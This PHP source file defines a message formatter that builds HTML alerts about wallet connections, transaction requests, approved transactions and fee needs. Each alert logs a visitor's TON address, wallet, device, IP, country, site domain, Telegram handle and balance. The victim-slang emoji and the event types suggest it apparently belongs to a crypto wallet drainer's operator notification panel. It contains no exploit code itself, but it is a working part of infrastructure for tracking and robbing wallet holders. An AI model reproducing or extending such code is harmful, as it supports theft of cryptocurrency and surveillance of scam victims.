<?php


namespace App\Services\Messages;

use App\Models\Domain;
use App\Services\Cloudflare\Client;
use App\Models\Chat;
use App\Models\Message;
use Exception;

class formatMessage
{
    public function format($data, $type): string
    {
        switch ($type) {
            case 'connectWallet':
                $message = $this->formatConnection($data);
                break;
            case 'aprovedTransaction':
                $message = $this->formatApprovedTransaction($data);
                break;
            case 'transactionRequest':
                $message = $this->formatTransactionRequest($data);
                break;
            case 'needForFee':
                $message = $this->formatNeedForFee($data);
                break;
            default:
                $message = "Неизвестный тип сообщения";
        }

        return $message;
    }

    private function formatConnection($data): string
    {
        return "🎈 New connection!<br>
└👛 Address: {$data['address']}<br>
└💎 Wallet: {$data['wallet']}<br>
└💻 Device: {$data['device']}<br>
└👁 IP: {$data['ip']} {$data['country_flag']}<br>
└🌐 Domain: {$data['domain']}<br>
└🦣 User: @{$data['username']} | {$data['user_id']}<br>
<br>
💳 Total Balance: {$data['balance']} TON | {$data['balance_usd']}$<br>
<br>
#connection";
    }

    private function formatTransactionRequest($data): string
    {
        $items = $this->formatItems($data['items']);

        return "🔁 Transaction requested!<br>
└👛 Address: {$data['address']}<br>
└💎 Wallet: {$data['wallet']}<br>
└💻 Device: {$data['device']}<br>
└👁 IP: {$data['ip']} {$data['country_flag']}<br>
└🌐 Domain: {$data['domain']}<br>
└🦣 User: @{$data['username']} | {$data['user_id']}<br>
<br>
📚 Items:<br>
{$items}<br>
💳 Total Balance: {$data['balance']} TON | {$data['balance_usd']}$<br>
<br>
#requested";
    }

    private function formatApprovedTransaction($data): string
    {
        $items = $this->formatItems($data['items']);

        return "✅ Transaction approved!<br>
└👛 Address: {$data['address']}<br>
└💎 Wallet: {$data['wallet']}<br>
└💻 Device: {$data['device']}<br>
└👁 IP: {$data['ip']} {$data['country_flag']}<br>
└🌐 Domain: {$data['domain']}<br>
└🦣 User: @{$data['username']} | {$data['user_id']}<br>
<br>
📚 Items:<br>
{$items}<br>
💳 Total Balance: {$data['balance']} TON | {$data['balance_usd']}$<br>
Total Items: {$data['total_items_ton']} TON | {$data['total_items_usd']}$<br>
<br>
#approved";
    }

    private function formatNeedForFee($data): string
    {
        return "🐊 Need for fee!<br>
└👛 Address: {$data['address']}<br>
└💎 Wallet: {$data['wallet']}<br>
└💻 Device: {$data['device']}<br>
└👁 IP: {$data['ip']} {$data['country_flag']}<br>
└🌐 Domain: {$data['domain']}<br>
└🦣 User: @{$data['username']} | {$data['user_id']}<br>
<br>
💳 Total Balance: {$data['balance']} TON | {$data['balance_usd']}$<br>
<br>
#fee";
    }

    private function formatItems($items): string
    {
        $formattedItems = '';
        // foreach ($items as $item) {
        //     $formattedItems .= "🔁 {$item['name']}<br>{$item['type']} | {$item['amount_ton']} TON | {$item['amount_usd']}$<br>";
        // }
        return $formattedItems;
    }
}